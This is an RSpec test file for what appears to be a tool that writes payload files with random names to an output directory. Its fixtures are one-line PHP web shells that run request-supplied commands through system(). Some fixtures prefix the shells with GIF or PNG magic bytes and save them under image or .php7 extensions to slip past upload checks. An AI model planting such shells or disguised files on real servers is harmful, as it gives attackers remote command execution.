################################################################################
#                                                                              #
# Test cases                                                                   #
#                                                                              #
################################################################################

describe GenerateOutputFileAction do
  it 'creates a file containing the product code and a random name' do
    code = '<?php system($_REQUEST["cmd"]); ?>'
    extension = 'php'
    run_creates_file_scenario(code, extension)
  end

  it 'creates a different file containing the product code and a random name' do
    code = '<?php system($_POST["commnad"]); ?>'
    extension = 'php7'
    run_creates_file_scenario(code, extension)
  end

  it 'creates a file including the specified preamble' do
    code = '<?php system($_REQUEST["cmd"]); ?>'
    preamble = '474946' # Gif file magic bytes
    extension = 'gif'
    run_creates_file_with_preamble_scenario(code, preamble, extension)
  end

  it 'creates a file with a different preamble' do
    # Create the preamble for a 1x1 white PNG'
    code = '<?php system($_REQUEST["cmd"]); ?>'
    preamble = '89504e470d0a1a0a0000000d494844520000000100000001010000000037'\
               '6ef9240000000a4944415408d76368000000820081dd436af40000000049'\
               '454e44ae426082'
    extension = 'png'
    run_creates_file_with_preamble_scenario(code, preamble, extension)
  end

  it 'adds the created filename to the product' do
    extension = 'php'
    run_adds_filename_to_product_scenario(extension)
  end

  it 'adds a differenet created filename to the product' do
    extension = 'php7'
    run_adds_filename_to_product_scenario(extension)
  end

  it 'adds the file checksum to the product' do
    code = '<?php system($_REQUEST["cmd"]); ?>'
    run_adds_checksum_to_product_scenario(code)
  end

  it 'adds a differenet file checksum to the product' do
    code = '<?php system($_GET["cmd"]); ?>'
    run_adds_checksum_to_product_scenario(code)
  end
end

################################################################################
#                                                                              #
# Test scenarios to reduce test code duplication                               #
#                                                                              #
################################################################################

def run_creates_file_scenario(code, extension)
  # Mock the SecureRandom's module hex method
  filename = Random.hex(32)
  expect(SecureRandom).to receive(:hex).with(32).and_return(filename)

  # Create a virtual filesystem
  FakeFS.with_fresh do
    # Create a product
    product = Product.new
    product.code = code

    # Create and run the action
    Dir.mkdir('output')
    file_info = FileInfo.new(extension)
    action = GenerateOutputFileAction.new(file_info)
    action.transform(product)

    # Expect the file to have been created
    File.open("output/#{filename}.#{extension}", 'r') do |f|
      expect(f.read).to eq(code)
    end
  end
end

def run_creates_file_with_preamble_scenario(code, preamble, extension)
  # Mock the SecureRandom's module hex method
  filename = Random.hex(32)
  expect(SecureRandom).to receive(:hex).with(32).and_return(filename)

  # Create a virtual filesystem
  FakeFS.with_fresh do
    # Create a product
    product = Product.new
    product.code = code

    # Create and run the action
    Dir.mkdir('output')
    file_info = FileInfo.new(extension, preamble)
    action = GenerateOutputFileAction.new(file_info)
    action.transform(product)

    # Create the expected content for the file
    expected_content = [preamble].pack('H*')
    expected_content << code

    # Open the file and compare the actual with the expected content
    File.open("output/#{filename}.#{extension}", 'r+b') do |f|
      expect(f.read).to eq(expected_content)
    end
  end
end

def run_adds_filename_to_product_scenario(extension)
  # Mock the SecureRandom's module hex method
  filename = Random.hex(32)
  expect(SecureRandom).to receive(:hex).with(32).and_return(filename)

  # Create a virtual filesystem
  FakeFS.with_fresh do
    # Create a product
    product = Product.new

    # Create and run the action
    Dir.mkdir('output')
    file_info = FileInfo.new(extension)
    action = GenerateOutputFileAction.new(file_info)
    action.transform(product)

    # Expect the product to contain the created filename
    expect(product.file).to eq("output/#{filename}.#{extension}")
  end
end

def run_adds_checksum_to_product_scenario(code)
  # Mock the SecureRandom's module hex method
  filename = Random.hex(32)
  expect(SecureRandom).to receive(:hex).with(32).and_return(filename)

  # Create a virtual filesystem
  FakeFS.with_fresh do
    # Create a product
    product = Product.new
    product.code = code

    # Create and run the action
    Dir.mkdir('output')
    file_info = FileInfo.new('php')
    action = GenerateOutputFileAction.new(file_info)
    action.transform(product)

    # Expect the product to contain the created filename
    checksum = OpenSSL::Digest::SHA256.file("output/#{filename}.php").hexdigest
    expect(product.checksum).to eq(checksum)
  end
end
